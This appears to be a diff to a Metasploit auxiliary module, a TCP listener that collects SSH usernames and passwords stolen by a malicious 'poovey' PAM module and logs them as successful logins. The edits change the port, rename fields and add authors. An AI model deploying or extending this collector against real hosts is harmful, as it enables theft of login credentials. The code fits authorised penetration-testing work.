@@ -2,9 +2,7 @@
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
 require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::TcpServer
@@ -17,7 +15,7 @@ class MetasploitModule < Msf::Auxiliary
         This module provides a lister to accept credentials stolen with the
         poovey PAM module.
       },
-      'Author'      => ['jrozner'],
+      'Author'      => ['jrozner', 'maus', 'javier didn\'t do shit'],
       'License'     => MSF_LICENSE,
       'Actions'     =>
         [
@@ -48,7 +46,7 @@ class MetasploitModule < Msf::Auxiliary
   def report_cred(opts)
     service_data = {
       address: opts[:ip],
-      port: 0,
+      port: 22,
       service_name: opts[:service_name],
       protocol: 'tcp',
       workspace_id: myworkspace_id
@@ -57,17 +55,17 @@ class MetasploitModule < Msf::Auxiliary
     credential_data = {
       origin_type: :service,
       module_fullname: fullname,
-      username: opts[:username],
-      private_data: opts[:password],
+      username: opts[:user],
+      private_data: opts[:pass],
       private_type: :password
     }.merge(service_data)
 
     login_data = {
       core: create_credential(credential_data),
-      status: Metasploit::Model::Login::Status::UNTRIED,
+      last_attempted_at: Time.now,
+      status: Metasploit::Model::Login::Status::SUCCESSFUL,
       proof: opts[:proof]
     }.merge(service_data)
-
     create_credential_login(login_data)
   end
 
@@ -80,10 +78,10 @@ class MetasploitModule < Msf::Auxiliary
     print_status credential.inspect
     report_cred(
       ip: c.peerhost,
-      port: 0,
+      port: 22,
       service_name: 'ssh',
-      username: credential["username"],
-      password: credential["password"],
+      user: credential["username"],
+      pass: credential["password"],
       proof: data
     )
 
